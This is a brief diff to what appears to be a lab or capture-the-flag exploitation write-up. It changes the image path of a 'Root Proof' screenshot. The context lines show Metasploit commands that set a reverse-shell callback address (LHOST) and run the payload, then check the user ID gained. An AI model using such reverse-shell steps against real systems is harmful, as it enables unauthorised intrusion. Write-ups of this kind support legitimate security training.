@@ -65,7 +65,7 @@ set LHOST 192.168.18.5
 run
 getuid
 ```
-![Root Proof](screenshot/root_proof.png)
+![Root Proof](Screenshot/131952.png)
 
 ---
 
